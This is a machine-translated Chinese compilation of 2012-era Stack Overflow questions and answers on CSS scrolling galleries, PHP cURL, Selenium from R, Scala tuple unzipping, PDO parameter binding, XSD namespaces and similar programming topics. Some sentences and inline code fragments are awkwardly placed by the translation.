我快要疯了。我使用了搜索和谷歌，但无法提出解决方案，它不起作用:(

我有一个嵌套在其他 div 中的 div，用于自动垂直居中和背景。最初它垂直适合多个图像并动态调整它们的大小。我根据图片的数量（宽度，填充）使用了几种css样式。

但是对于这个画廊，我有很多图片，原来的布局分成几行，但我想要一个嵌套的 "white-space:nowrap" 和 overflow-x: auto; 在我的分区中。所以我可以滚动它们，但是“white-space:nowrap”会破坏所有的东西，破坏所有的 display:table 属性。

我想这应该发生？但是我需要一个其他的解决方案或至少一个善意的提示。

我还做了一个简化的小提琴： http: [//jsfiddle.net/x696B/9/](http://jsfiddle.net/x696B/9/) 如果你删除它的工作显示表属性，并滚动。我需要在我的 div 中。:D

这是我的nooby css（相关部分）

```
html
{
    height:100%;
}

body 
{
    height:98%;
    background-color: #FFF9E5;  
    padding: 0px;                               

  }    
.wrapper
{
        margin:auto;
        padding: 0px;
        z-index: 0;
        height:100%;
        width:100%;
        display:table;
    vertical-align:middle;
}

    .outer
    {
        z-index: 0;
        padding: 0px;
        display:table-cell;
        vertical-align:middle;
        background-color: #FFF9E5;
     }

div.container
{
        margin: 0           auto;
            display:table;
        z-index: 0;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        border-radius: 5px;
        width:60%;
        background-color: #867F27;
        padding-right:1%;
            padding-left:1%;
            white-space: nowrap;
            overflow: auto;
    } 

     .view
     {
        width:100%;
        white-space: nowrap;
        overflow-x: auto; 
        margin: 0 auto;
        text-align: left;
     } 
```

如果我将 display:table 和 display:table-cell 标记为评论，则画廊看起来不错并且可以滚动，但它没有居中。（得到其他带有徽标的div等）

这是我的html

```
<meta http-equiv="X-UA-Compatible" content="IE=9" />
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="de">
<head>
    <meta charset="utf-8">
    <title>my page</title>
        <style type="text/css">
        @import url("style.css");
    </style>
</head>
<body>

<div class="wrapper">
    <div class="outer">
        <div class = "logo"><img src="logo.png"/></img></div>
        <div class="container">
                <div class="view">
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-1.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-2.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-3.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-4.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-5.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-6.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-7.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-8.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-9.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-1.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-2.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-3.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-4.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-5.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-6.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-7.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-8.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-9.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-1.jpg"/>
                    <img src="http://lorempixel.com/output/nature-q-c-205-154-2.jpg"/>
        </div>
    </div>
</div>

</body>
</html> 
```

哦，原谅我这个愚蠢的问题，到目前为止这个论坛是一个很大的帮助，但现在我输了。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-13T08:35:38.013

我得到了一个解决方案谢谢大家，你让我的大脑工作:) 并帮助我看到了解决方案我改变了视图类的宽度

```
 .view
 {
    /*width:100%;*/ /*this resizes but nested in divs */
                    /*with display:table; it breaks them*/

    width:800px;    /*with a fixed width it works very nice*/
    max-width: 75%; /*lets the gallery shrink on resize of the browser*/

    white-space: nowrap;
    overflow-x: auto; 
    margin: 0 auto;
    text-align: left;
 } 
```

所以我得到了垂直居中的结构，可以保留在其他页面上，并将其用于我的画廊。如果您调整浏览器窗口的大小并且看起来仍然不错，它甚至会调整大小（在一定程度上）。祝你今天过得愉快 ：）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:26:13.360

添加`line-height: 0;`到您的`#view`样式中。`img`这将删除`#view div`. 另外，我删除了一些你不需要的东西，我把你的`display: table;`. 在大多数情况下，您不应该使用该显示样式。看看这个[小提琴](http://jsfiddle.net/scrimothy/cQf44/1/)，让我知道这是否适合你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-31T15:41:38.393

更简单的是在你的容器中添加：

`table-layout: fixed;`

# php - 最广泛启用的 PHP cURL 或 https 流包装器 (openssl)

> ID：12392397
> 
> 赞同：1
> 
> 时间：2012-09-12T16:12:46.367
> 
> 标签：php, curl, https, openssl, portability

我正在尝试编写可移植的 php 应用程序。我想要的是让这段代码使用 PHP >= 5.2 在尽可能多的共享主机提供商上工作

我需要这段代码来操作 Dropbox API，所以需要 https 支持。据我了解，我有 2 个选项 - cURL 和来自 openssl 扩展的 https 流包装器。

我的问题是您会推荐在大多数托管服务提供商上启用的哪一个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:17:25.617

查看PHP 手册中的[此页面](http://www.php.net/manual/en/intro.curl.php)`cURL`，这些函数是“在 PHP 4.0.2 中”添加的。

因此，我认为您可以使用 >=5.2 服务器。此外，cURL 比 PHP Stream 函数要好得多。所以，坚持使用 cURL！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:45:57.857

@stormbreaker

据我了解

`Code Portability : Means writing your program (code) in such a way that the same code works on different environments. You should be easy to understand , identify exceptions and maintain`

`Widely Enabled : Means as Having great extent or range in availability by default or supported by majority of service providers`

[CURL](http://php.net/manual/en/book.curl.php)支持同一个库中的更多功能、清洁器、多重处理等。

`https stream wrapper`更广泛可用可能会非常棘手，具体取决于您何时将表单平台移动到平台，具体取决于应用程序

# entity-framework - 具有重叠（非不相交）实体的实体框架 Table-Per-Type 继承

> ID：12392402
> 
> 赞同：1
> 
> 时间：2012-09-12T16:12:59.603
> 
> 标签：entity-framework, table-per-type

我正在使用带有 DDD 和层的 EF4，并且我需要在我的数据模型中实现一个 Table-Per-Type 层次结构，其中包含非不相交（重叠）的实体，这样的[模型](http://www.robbagby.com/entity-framework/entity-framework-modeling-table-per-type-inheritance/)。无论如何，我不知道该怎么做，也找不到任何具有重叠实体的 TPT 示例。我有什么办法可以做到这一点？（对不起我的英语不好）。

# asp.net - 使用 windows server 2008 r2 DFS 在 Web Farm 中进行缓存。有什么例子吗？

> ID：12392403
> 
> 赞同：0
> 
> 时间：2012-09-12T16:13:02.497
> 
> 标签：asp.net, asp.net-mvc-3, caching, windows-server-2008-r2, microsoft-distributed-file-system

任何示例，哪个详细使用 Windows Server 2008 r2 DFS 在 Web 场（托管在多个服务器上的应用程序）中管理 asp.net mvc 3 缓存？

我会很感激你的回应。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T21:05:08.493

对于 Web 场中的缓存，您可以使用[Windows Server AppFabric Caching](http://msdn.microsoft.com/en-us/library/ff817046%28v=azure.10%29.aspx)。

这个话题非常庞大。如果您有具体问题，我们可以帮助您！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T17:18:11.023

你是说这玩意儿？[http://msdn.microsoft.com/en-us/library/xsbfdd8c%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/xsbfdd8c%28v=vs.100%29.aspx)

如果您使用的是非服务器场或常规文件系统，则应该没有什么不同。

你有具体的问题吗？

# r - 在 R 中访问 Selenium api

> ID：12392404
> 
> 赞同：1
> 
> 时间：2012-09-12T16:13:04.703
> 
> 标签：r, selenium

我对在 R 中使用 selenium 很感兴趣。我注意到这里描述了各种文档[WebDriver (Selenium 2) API documentation](https://stackoverflow.com/questions/5644868/webdriver-selenium-2-api-documentation)。有没有用 R 完成任何工作。我将如何处理这个问题。在文档中，它记录了有关运行 selenium 服务器的说明，并且可以使用 Javascript 查询 api。任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:14:33.560

Selenium 可以使用[JsonWireProtocol](http://code.google.com/p/selenium/wiki/JsonWireProtocol "JsonWire协议")访问。

首先通过以下方式从命令行启动 Selenium 服务器：

```
java -jar selenium-server-standalone-2.25.0.jar 
```

一个新的火狐浏览器可以打开如下：

```
library(RCurl)
library(RJSONIO)
library(XML)

baseURL<-"http://localhost:4444/wd/hub/"
server<-list(desiredCapabilities=list(browserName='firefox',javascriptEnabled=TRUE))

getURL(paste0(baseURL,"session"),
       customrequest="POST",
       httpheader=c('Content-Type'='application/json;charset=UTF-8'),
       postfields=toJSON(server))

serverDetails<-fromJSON(rawToChar(getURLContent('http://localhost:4444/wd/hub/sessions',binary=TRUE)))
serverId<-serverDetails$value[[1]]$id 
```

导航到谷歌。

```
getURL(paste0(baseURL,"session/",serverId,"/url"),
       customrequest="POST",
       httpheader=c('Content-Type'='application/json;charset=UTF-8'),
       postfields=toJSON(list(url="http://www.google.com"))) 
```

获取搜索框的id

```
elementDetails<-fromJSON(rawToChar(getURLContent(paste0(baseURL,"session/",serverId,"/element"),
       customrequest="POST",
       httpheader=c('Content-Type'='application/json;charset=UTF-8'),
       postfields=toJSON(list(using="xpath",value="//*[@id=\"gbqfq\"]")),binary=TRUE))
       )

elementId<-elementDetails$value 
```

搜索主题

```
rawToChar(getURLContent(paste0(baseURL,"session/",serverId,"/element/",elementId,"/value"),
       customrequest="POST",
       httpheader=c('Content-Type'='application/json;charset=UTF-8'),
       postfields=toJSON(list(value=list("\uE009","a","\uE009",'\b','Selenium api in R')))
       ,binary=TRUE)) 
```

返回搜索 html

```
googData<-fromJSON(rawToChar(getURLContent(paste0(baseURL,"session/",serverId,"/source"),
       customrequest="GET",
       httpheader=c('Content-Type'='application/json;charset=UTF-8'),
       binary=TRUE
       ))
       ) 
```

获取建议的链接

```
gxml<-htmlParse(googData$value)
urls<-unname(xpathSApply(gxml,"//*[@class='l']/@href")) 
```

关闭会话

```
getURL(paste0(baseURL,"session/",serverId),
       customrequest="DELETE",
       httpheader=c('Content-Type'='application/json;charset=UTF-8')
       ) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-11T15:25:00.843

我想废弃每一轮的足球比赛桌，但不知道该怎么做，如果你愿意为我遮光，我会很感激...... [使用 R 连接 Selenium-Server-Standalone](https://stackoverflow.com/questions/19321739/using-r-to-call-selenium-server-standalone-function-library)

```
elementDetails<-fromJSON(rawToChar(getURLContent(paste0(baseURL,"session/",serverId,"/element"),
   customrequest="POST",
   httpheader=c('Content-Type'='application/json;charset=UTF-8'),
   postfields=toJSON(list(using="xpath",value="//*[@id="Match_Table"]")),binary=TRUE))
   )

elementId<-elementDetails$value 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-25T22:52:35.043

最近开发了 relenium 包（Selenium for R），通过 rJava 包导入[selenium](http://lluisramon.github.io/relenium/)。它主要用于网页抓取。免责声明：我是开发人员之一。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-12-15T14:46:57.887

现在，R 包 RSelenium 存在并且可以按如下方式使用：

```
library(RSelenium)
shell('docker run -d -p 4445:4444 selenium/standalone-firefox')
remDr <- remoteDriver(remoteServerAddr = "localhost", port = 4445L, browserName = "firefox")
remDr$open()
remDr$navigate("https://www.google.com/") 
```

# android - 应用程序未打开 LAUNCHER 活动

> ID：12392406
> 
> 赞同：2
> 
> 时间：2012-09-12T16:13:10.363
> 
> 标签：android

在我的应用程序中，说 A 的活动是启动器活动，从 A 调用 B，从 B 调用 C，我有超过 3 个活动。在 C 中，当我按下主页按钮并再次打开我的应用程序时，它会打开 C。但我希望它始终打开启动器活动。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:14:38.913

然后在每个活动的 onPause() 回调方法中执行 finish()。即使您按下主页按钮，这也可以帮助您每次都将活动 A 作为启动器

# scala - Scala：如何将元组元素转换为列表

> ID：12392409
> 
> 赞同：14
> 
> 时间：2012-09-12T16:13:20.710
> 
> 标签：scala, tuples, higher-order-functions

假设我有以下元组列表：

```
val tuples = listOfStrings.map(string => {
            val split = string.split(":")
            (split(0), split(1), split(2))
        }) 
```

我想在一个列表中获取 split(0)，在另一个列表中获取 split(1)，依此类推。实现这一点的一个简单方法是编写：

```
list1 = tuples.map(x => x._1).toList
list2 = tuples.map(x => x._2).toList
list3 = tuples.map(x => x._3).toList 
```

有没有更优雅（功能）的方式来实现上述目标，而无需编写 3 个单独的语句？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-12T16:42:20.647

这将为您提供作为列表列表的结果：

```
tuples.map{t => List(t._1, t._2, t._3)}.transpose 
```

如果要将它们存储在局部变量中，只需执行以下操作：

```
val List(l1,l2,l3) = tuples.map{t => List(t._1, t._2, t._3)}.transpose 
```

**更新**：正如 Blaisorblade 所指出的，标准库实际上有一个内置的方法：`unzip3`，这就像`unzip`但是对于三元组而不是对：

```
val (l1, l2, l3) = tuples.unzip3 
```

不用说，与我上面的手动解决方案相比，您应该更喜欢这种方法（但对于 arity > 3 的元组，这仍然适用）。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-06-24T17:23:52.690

你想解压：

```
scala> val (numbers, homonyms) = List(("one", "won"), ("two", "too")).unzip
numbers: List[java.lang.String] = List(one, two)
homonyms: List[java.lang.String] = List(won, too) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-12T17:01:32.120

如果你想要一些可以用于任意元组大小的东西：

```
val tupleSize = 3
0.until(tupleSize).toList
    .map(x => (_:Product).productElement(x).asInstanceOf[String])
    .map(tuples.map(_)) 
```

显然，如果您有一个数组列表，则可以更优雅地表达这一点。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-12T16:32:19.973

您可以将语句写在一行中。

像

```
 (list1, list2, list3) = tuples.foldRight((List[String](), List[String](), List[String]()))( (a,b) => (a._1 :: b._1, a._2 :: b._2, a._3 :: b._3 ) ) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-12T16:53:20.770

我不知道优雅，但你*可以*在一行中完成，而无需存储元组的中间步骤。可能读起来有点难……

```
(for(split <- listOfStrings.map(_.split(":")))
  yield List(split(0), split(1), split(2))).transpose 
```

复制示例：

```
scala> listOfStrings
res1: List[java.lang.String] = List(a:b:c, d:e:f, g:h:i)

scala> (for(split <- listOfStrings.map(_.split(":")))
     |   yield List(split(0), split(1), split(2))).transpose
res2: List[List[java.lang.String]] = List(List(a, d, g), List(b, e, h), List(c, f, i)) 
```

# language-agnostic - 定义包装代码

> ID：12392410
> 
> 赞同：3
> 
> 时间：2012-09-12T16:13:39.713
> 
> 标签：language-agnostic

*包装器*一词是什么意思？

开发人员经常说：“我要围绕这段代码构建一个包装器。”

这是什么意思？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:15:38.430

包装器是一个非常通用的术语，但它通常用于围绕原始数据类型或内置函数创建程序员定义的函数或类。

这样做的原因有很多，但通常是为了引入另一个抽象级别，因此只需在一个地方对常用函数或例程进行更改。

例如

`Integer``int`是Java中原始类型的包装器。

您还可以围绕控制台打印行语句创建一个包装器，如下所示：

```
public void printStuff(String s) {
  System.out.println(s);
} 
```

# c++ - 刷新MFC界面VC++ 2010

> ID：12392414
> 
> 赞同：1
> 
> 时间：2012-09-12T16:13:52.373
> 
> 标签：c++, visual-studio-2010, mfc

我通过 Visual Studio 2010 开发了一个 MFC 应用程序。应用程序的界面包含一棵树，我使用 CPropTree 库来构建树。现在我需要定期刷新这个界面并重建树。

我怎么做？你有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T04:15:16.037

创建一个不同的线程，放置`Sleep`或其他一些指令。每次迭代后，对该树控件或该控件的父级使用`SendMessage`（或）。`PostMessage`同一线程上的计时器将无法正常工作。

# maps - 谷歌地图仅在所有其他搜索请求中生成

> ID：12392420
> 
> 赞同：0
> 
> 时间：2012-09-12T16:14:09.480
> 
> 标签：maps

我有一个页面，可以在数据库中搜索输入邮政编码中的商店，将它们映射为谷歌地图上的 POI，并在单击“显示地图”时显示地图。*我的*问题是地图似乎只为每次点击生成。我提供了生成表和地图的代码（在同一个 ajax 调用中）。

更具体地说，我所指的点击是调用 ajax 代码的搜索功能的触发器，而不是“显示地图”点击。换句话说，当我第一次搜索邮政编码时，我可以查看地图。第二次搜索没有产生地图，第三次产生地图......等等......

非常感激任何的帮助

代码如下：

```
function retrieve_stores_in_prox(){
    $('.trigger2').click(function() {   
        $("#map_store").each(function(){
            if ($(this).css("display") == "none")
            {
                $(this).css("display", "block");
            }
            else
            {
                $(this).css("display", "none");
             }
        })
    });
$(document).ready(function() {
    $('#storeList').empty().trigger("update");
    //initialize the store map

    var redicon = new GIcon();
    redicon.image = "images/redCircle.png";
    redicon.iconSize = new GSize(11, 11);
    redicon.iconAnchor = new GPoint(6, 6);
    redicon.infoWindowAnchor = new GPoint(6,6);

    $.ajax({
    type: 'post',
    url: 'trip_planner_store.php',
    dataType: "xml",
    cache: false,
    data: {zip:$("#zip").val()},
    success: function(data) {
        var storemap = new GMap2(document.getElementById("map_store"), { size: new GSize(500,320) });
        storemap.addControl(new GLargeMapControl());
        storemap.addControl(new GMapTypeControl());

        var lat1 = $(data).find('LAT1').text();
        var lon1 = $(data).find('LON1').text();
        storemap.setCenter(new GLatLng(lat1,lon1),8);
        google.maps.event.trigger(storemap, 'resize');

        $(data).find('STORE').each(function(index){
        var lat = parseFloat($(this).find('LATITUDE').text());
        var long = parseFloat($(this).find('LONGITUDE').text());

        var marker = new GMarker(new GLatLng(lat,long), { 
            draggable: false, 
            title: ($(this).find('COMPANY_NAME').text()), 
            icon: redicon,
            disableAutoPan: true,
            supressMapPan: true
        });

        var html = {some stuff for the info window}
                    GEvent.addListener(marker, 'mouseover', function() {
            // When clicked, open an Info Window
                        marker.openInfoWindowHtml(html);

                    });
        storemap.addOverlay(marker);
        //update the store table with the information

           var storeList = {html markup for table};

           //append the current row to the installer table
        $('#storeList').append(storeList);

    });
    $('#storeList').trigger("update");

    }
});
}); 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T19:39:52.490

我已经解决了这个难题。错误实际上是我的点击触发事件位于函数调用中。我将它移到我的脚本标签的顶部，它现在按预期运行。我不知道为什么在被调用函数中触发点击事件只适用于其他所有调用。任何猜测将不胜感激。

# python - Python将光标移动到.txt行的末尾

> ID：12392423
> 
> 赞同：2
> 
> 时间：2012-09-12T16:14:13.990
> 
> 标签：python

我需要在文本文件的每一行末尾写（）文本。如何将光标指向特定行的末尾。

注意：seek(0,2) 会将我放在文件的末尾，但我需要每一行的末尾。

感谢帮助人员-我已经结合了您的解决方案来实现我的需要：

```
AllLines = [ (str.rstrip('\n') + 'Val2' + "\n" ) for str in AllLines ] 
```

然后我可以将 AllLines 写入一个新的输出文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:18:43.127

您需要分两步执行此操作。由于创建新文件更安全，您可以：

```
with open("input.txt") as infile, open("output.txt", "w") as outfile:
    for line in infile:
        outfile.write(line.rstrip("\n") + "added text\n") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:18:28.013

```
new_lines = []
with open("my_file") as f:
       new_lines = [line.strip("\n")+"some_ending_stuff" for line in f]
with open("my_file","w") as f:
       f.write("\n".join(new_lines)) 
```

类似的东西应该工作

# php - PDO bindParam 与执行

> ID：12392424
> 
> 赞同：61
> 
> 时间：2012-09-12T16:14:16.767
> 
> 标签：php, pdo

我经常看到使用PDO`bindParam`或`bindValue`与 PDO 一起使用的代码。是否只是`execute`出于任何原因传递论点而皱眉？

我知道`bindParam`实际上绑定到变量，并且您可以设置与这两种`bind`方法绑定的参数类型，但是如果您只插入字符串怎么办？

```
$query = "SELECT col1 FROM t1 WHERE col2 = :col2 AND col3 = :col3 AND col4 = :col4";
$pdo->bindValue(':col2', 'col2');
$pdo->bindValue(':col3', 'col3');
$pdo->bindValue(':col4', 'col4'); 
```

我经常看到上面的，但我个人更喜欢：

```
$pdo->execute(array(':col2' => 'col2', ':col3' => 'col3', ':col4' => 'col4')); 
```

它没有那么冗长和直观，让输入一起“进入”查询对我来说更有意义。但是，我几乎没有看到它被使用过。

当您不必利用前者的特殊行为时，是否有理由更喜欢`bind`方法而不是传递参数？`execute`

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2012-09-12T16:25:42.857

`bindParam`当您只想将变量引用绑定到查询中的参数时，您可能会发现使用它，但可能仍需要对其进行一些操作并且只希望在查询执行时计算变量的值。它还允许您执行更复杂的操作，例如将参数绑定到存储过程调用并将返回值更新到绑定变量中。

有关更多信息，请参阅[bindParam 文档](https://secure.php.net/manual/en/pdostatement.bindparam.php)、[bindValue 文档](https://secure.php.net/manual/en/pdostatement.bindvalue.php)和[执行文档](https://secure.php.net/manual/en/pdostatement.execute.php)。

例如

```
$col1 = 'some_value';
$pdo->bindParam(':col1', $col1);
$col1 = 'some_other_value';
$pdo->execute(); // would use 'some_other_value' for ':col1' parameter 
```

`bindValue`并传递一个数组，使其`execute`行为方式与参数值在该点固定并相应地执行 SQL 的方式大致相同。

遵循上面相同的示例，但使用`bindValue`

```
$col1 = 'some_value';
$pdo->bindValue(':col1', $col1);
$col1 = 'some_other_value';
$pdo->execute(); // would use 'some_value' for ':col1' parameter 
```

当直接在所有值中传递值时，`execute`所有值都被视为字符串（即使提供了整数值）。因此，如果您需要强制执行数据类型，则应始终使用`bindValue`or `bindParam`。

我认为您可能会看到在参数声明中显式定义数据类型的`bind*`使用比`execute(array)`许多人认为的更好的编码实践更多。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-12T16:26:53.850

通过将参数与`$pdo->execute()`方法一起传递，数组中的所有值都将被传递，对于带有函数`PDO::PARAM_STR`的语句。`$pdo->bindParam()`

我现在可以看到的主要区别是，通过函数，您可以使用[PHP.net 手册](http://php.net/manual/en/pdo.constants.php)中描述`$pdo->bindParam()`的常量定义传递的数据类型[`PDO::PARAM_*`](http://php.net/manual/en/pdo.constants.php)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-08-01T07:12:11.247

很简单，bindParam 的值可能会改变，但 bindValue 的值不能改变。例子：

```
$someVal=10;
$someVal2=20;
/* In bindParam, the value argument is not bound and 
will be changed if we change its value before execute.
*/
$ref->bindParam(':someCol',$someVal);
$someVal=$someVal2;
$ref->execute();
//someCol=20
/* In bindValue, the value argument is bound and 
never changed if we change its value before execute.
*/
$ref->bindValue(':someCol',$someVal);
// here assignment is referral (&$someVal)
$someVal=$someVal2;
$ref->execute();
//someCol=10 
```

# java - 对于 Android，我应该在我的游戏中更频繁地使用 float 数据类型，还是只是在绘图时强制转换为 float？

> ID：12392433
> 
> 赞同：12
> 
> 时间：2012-09-12T16:14:46.360
> 
> 标签：java, android

Android 使用 RectF 结构来绘制位图。我正在研究我的游戏结构，例如，Sprite 将具有 x/y 坐标、宽度、高度、速度等。这意味着每次在我的渲染循环中，我必须在确定要使用的源/目标 RectF 时将这些整数转换为浮点数......或者，我可以更加通用并在任何地方使用浮点数，以便在需要时模拟物理和渲染，所有类型都已经是相同的类型......即使属性是不必要的（我不需要“x位置”的浮点数，但在渲染时必须转换它如果不是）。

如果浮动通常是 2-10 倍的效率低下（根据[http://developer.android.com/guide/practices/performance.html](http://developer.android.com/guide/practices/performance.html)），那么正确的做法是什么？

TLDL：我应该将 int's 转换为在渲染时浮动，还是让所有贡献变量一开始都是浮点数，即使浮点数效率低下？类型转换的效率有多低？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:26:27.047

执行此操作的最佳方法是以在指定公差内产生预期结果所需的最高精度进行计算。这意味着如果您需要使用双打进行计算并获得一致的预期结果，请使用它们。找出可以接受较低精度的地方，并且只使用浮点数执行需要它的操作。请记住，您的世界不必为坠落物体近似地球重力，您可以简化事物并将重力设为 10 而不是 9.81，使像素对应于偶数单位等。如果您在相同的单位并避免进行单位转换以进行数学运算（因为这会导致额外的操作），最好添加更多最终常数，例如重力，以厘米/秒为单位，m/s 和 km/h 比只有一个并转换一千次。哦，与乘以 2 个浮点数相比，将 int 转换为浮点数的成本并不是很高，所以请考虑一下。

我还会注意到 FPU 在现代安卓手机中变得越来越普遍，因此使用浮点数学的问题变得不那么重要了（尽管不完全是）。

我要注意的另一件事是 Double/Float/Integer 与 double/float/int。前者需要创建新对象才能使用并且不应该用于数学（只要可能），而后者是原语并且不会导致创建新对象来使用，它们的创建成本较低。

# opengl-es-2.0 - 是否使用 GLKit？

> ID：12392435
> 
> 赞同：2
> 
> 时间：2012-09-12T16:14:54.823
> 
> 标签：opengl-es-2.0, glkit

我正在为 IOS 学习 OpenGL ES。

除了对 IOS 5 以下的东西的向后兼容性之外，任何人对使用没有 GLKit 东西的直接 OpenGl ES 2.0 开发基于 3D 图形的游戏有什么看法？

我意识到该套件使事情变得更容易。我并不完全关心更容易，只是在没有 GLKit 的情况下使用 OpenGL ES 2.0 是否有更多功能。

# cakephp - CakePHP - 来自同一模型的同一页面上的多个分页数据集

> ID：12392442
> 
> 赞同：0
> 
> 时间：2012-09-12T16:15:38.357
> 
> 标签：cakephp

我有一个从我的 ExpenseClaim 模型中提取数据的管理页面。我想要 3 个不同的分页表，每个表根据不同的条件（状态）显示数据。这就是我在控制器中拥有的（不起作用 - 视图中没有任何分页）：

```
// Pending
$this->set('claims', $this->paginate('ExpenseClaim', array('ExpenseClaim.claim_status_id' => '2')));

// Get approved
$this->set('approvedClaims', $this->paginate('ExpenseClaim', array('ExpenseClaim.claim_status_id' => '3')));

// Get Declined
$this->set('declinedClaims', $this->paginate('ExpenseClaim', array('ExpenseClaim.claim_status_id' => '4'))); 
```

有谁知道我怎么能做到这一点，我已经进行了大量搜索，但只找到了与使用 jquery 插件的不同模型或黑客相关的东西。当然，这可以单独在蛋糕中完成吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-22T08:12:12.577

您是否在 ExpenseClaimsController 中编写了上述代码？但如果您在另一个控制器中，请确保您有一个分页变量，如下所示

```
public $paginate = array(
   'ExpenseClaim' => array(
         .......
   )
); 
```

# xml - XSD 验证需要它抱怨的元素

> ID：12392447
> 
> 赞同：4
> 
> 时间：2012-09-12T16:16:01.127
> 
> 标签：xml, soap, xsd, soapui, xml-validation

我在 SOAP 响应验证上遇到了一个奇怪的问题。我已经将响应和 XSD 降低到重现错误所需的最低限度。XSD：

```
<?xml version="1.0"?>
<xs:schema targetNamespace="http://peoplesoft.com/rootResponse" xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="root">
    <xs:complexType>
      <xs:sequence>
        <xs:element maxOccurs="unbounded" name="ReturnID" />
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema> 
```

SOAP 响应：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soapenv:Body>
    <root xmlns="http://peoplesoft.com/rootResponse">
      <ReturnID />
    </root>
  </soapenv:Body>
</soapenv:Envelope> 
```

如果我在 soapUI 中验证原始响应，它**会在元素 root@http://peoplesoft.com/rootResponse 中显示预期元素“ReturnID”而不是“ReturnID@http://peoplesoft.com/rootResponse”**。

当我在 Visual Studio 2012 中加载上述文件时（是的，我确实告诉 Visual Studio 使用此 XSD 文件来验证命名空间），我得到这个：**命名空间'http://peoplesoft.com/rootResponse 中的元素'root' ' 在命名空间 'http://peoplesoft.com/rootResponse' 中有无效的子元素 'ReturnID'。预期的可能元素列表：'ReturnID'。**

在这两种情况下，它都会对**ReturnID**元素大喊大叫，但它说它需要**ReturnID**元素？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:49:58.547

除非您正在处理非常不寻常的实例文档，否则您的 xs:schema 元素应该带有属性`elementFormDefault="qualified"`。如果没有这个，本地元素声明（例如 ReturnID 的声明）将引用非命名空间中的元素，而不是目标命名空间中的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:24:31.343

基本上，xml验证器想要

~~返回ID~~

```
<ReturnID xmlns="http://peoplesoft.com/rootResponse" /> 
```

成为

~~ReturnID xmlns="http://peoplesoft.com/rootResponse"~~

```
<ReturnID /> 
```

更改文档如下：

```
<ps:root xmlns:ps="http://peoplesoft.com/rootResponse">
  <ReturnID />
</ps:root> 
```

**编辑** 原因是通过`root xmlns="http://peoplesoft.com/rootResponse"`在您的文档上指定，所有内部元素也将采用此命名空间。

# desktop-application - 我的 MPI 作业在哪里运行？

> ID：12392449
> 
> 赞同：1
> 
> 时间：2012-09-12T16:16:26.250
> 
> 标签：desktop-application, mpi

我在有 8 个处理器（实际上是 2 个四核）的桌面上运行 MPI 作业。由于我看到一些糟糕的性能，我怀疑我的两个或多个进程在同一个处理器上运行。这不是集群系统；所有处理器都具有相同的名称。有什么方法可以告诉我我的进程到底在哪里运行？谢谢。

# multithreading - 使用 libjingle 登录 XMPP

> ID：12392450
> 
> 赞同：1
> 
> 时间：2012-09-12T16:16:31.793
> 
> 标签：multithreading, xmpp, libjingle

